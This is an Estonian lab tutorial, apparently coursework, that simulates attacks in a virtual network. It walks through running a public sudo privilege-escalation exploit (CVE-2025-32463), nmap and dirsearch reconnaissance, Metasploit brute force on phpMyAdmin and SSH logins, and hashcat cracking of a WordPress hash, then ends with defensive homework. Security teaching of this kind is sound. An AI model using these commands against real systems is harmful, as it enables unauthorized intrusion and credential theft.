# ⚙️ PRAKTILINE TUND: Võrguturbe Rünnakute Simulatsioon
**Autor:** ocrHeiki 
**Aeg:** 31.10.2025

## Sissejuhatus
See praktikum tutvustab võrguturbe põhitõdesid läbi praktilise harjutuse. Me seadistame virtuaalse keskkonna, simuleerime erinevaid rünnakuid ja uurime, kuidas süsteemid võivad olla haavatavad. Töövoog järgib järjestust: masinate seadistamine, privilege escalation Ubuntu Serveris, skännimine ja uurimine Kali masinaga, ning lõpuks kodutöö kaitsmise kohta. Kõik toimub kontrollitud virtuaalses keskkonnas, et õppida turvaliselt. 

**NB!!!** Kõik paroolid on siin õppe eesmärgil näitlikult lihtsad!

## Masinad :computer:
---
- **Ubuntu Server testmasin**: Seadistatud virtuaalselt, kasutatud ISO külgeühendamist.
- **Ruuter koos 2 network adapteriga**: Esimene adapter INTERNET, teine meie nimeline VLAN. ISO külgeühendatud mõlemale.
- **App masin**: Võetud Template kaustast, lisaks mujalt masinad.

## :computer: Ubuntu Server: Privilege Escalation Simulatsioon
---
1. Paigalda GCC kompilaator:  
   `sudo apt install gcc`

2. Loo uus kasutaja ilma sudo õigusteta:  
   `sudo adduser kala` (parool: `ka1a`)  
   Logi välja sudo kasutajast (`exit`) ja sisse uue kasutajaga.

3. Tõmba alla haavatavuse masin (simulatsioon):  
   `git clone https://github.com/kh4sh3i/CVE-2025-32463.git`

4. Uuri kaustu:  
   `ls`  
   Liigu kausta: `cd CVE-2025-32463` (kasuta Tab-klahvi täiendamiseks).

5. Muuda skript käivitatavaks ja käivita:  
   `chmod +x exploit.sh`  
   Kontrolli kasutaja ID: `id`  
   Käivita exploit: `./exploit.sh` (saad root-õigused).

6. Määra root-parool (kui puudub):  
   `passwd root` (parool: `ruutjuur`)

7. Uuenda süsteem ja paigalda sudo:  
   `apt update && apt install sudo`

## :computer: Kali: Skännimine, Andmebaasi Rünnakud ja Brute Force
---
### Alustame NMAP-iga (võrgu skännimine)
- Skänni võrku teenuste ja OS-idega:  
  `sudo nmap -sV -O 192.168.1.0/24` (lisa oma võrgu ID).  
  Näed tulemusi, sealhulgas port 22 (SSH), mis on häkkerite sihtmärk. Port knocking võib seda avada.

- Ava skännis leitud IP (nt 192.168.1.69) brauseris: Näed WordPressi lehte.  
  Kontrolli protokolle terminalis:  
  `whatweb 192.168.1.69` (näitab veebilehe ehitust).

- Paigalda ja kasuta dirsearch tööriista:  
  `sudo apt install dirsearch -y`  
  `dirsearch -u "192.168.1.69"` (uurib katalooge).

### Metasploit: phpMyAdmin Login Brute Force
- Ava Metasploit:  
  `msfconsole`

- Vali moodul:  
  `use auxiliary/scanner/http/phpmyadmin_login`

- Vaata valikuid:  
  `options`

- Määra sihtmärk:  
  `set rhost 192.168.1.69`  
  `set targeturi /phpmyadmin/index.php`

- Loo kasutajate fail:  
  `echo root >> /tmp/user.txt`  
  `set user_file /tmp/user.txt`

- Määra paroolide fail (kasuta rockyou.txt):  
  `set pass_file /home/heiki/Documents/rockyou.txt`

- Käivita (ainult omal vastutusel, kriminaalne tegevus):  
  `run`  
  Saad andmebaasi parooli ja WordPressi hashitud parooli.  
  Välju: `exit`

### Hashcat: Parooli Kräkkimine
- Kräki hashitud parool:  
  `hashcat 'hashitud_parool' /usr/share/wordlists/rockyou.txt.gz`  
  Saad selge parooli, millega sisse logida WordPressi admin-kontosse.  
  (White-hat häkkerina: Tee postitus nõrga parooli kohta.)

### Metasploit: SSH Login Brute Force
- Vali moodul:  
  `use auxiliary/scanner/ssh/ssh_login`

- Määra failid:  
  `set user_file /tmp/user.txt`  
  `set pass_file /home/heiki/Documents/rockyou.txt`

- Käivita:  
  `run`

## Kodutöö 📓
Kirjelda, kuidas neid kolme rünnakut (privilege escalation Ubuntu Serveris, NMAP-skännimine ja Metasploit-rünnakud Kali masinaga) süsteemi eest kaitsta. Tee sellest dokumentatsioon, mis sisaldab potentsiaalseid viise kaitsmiseks.
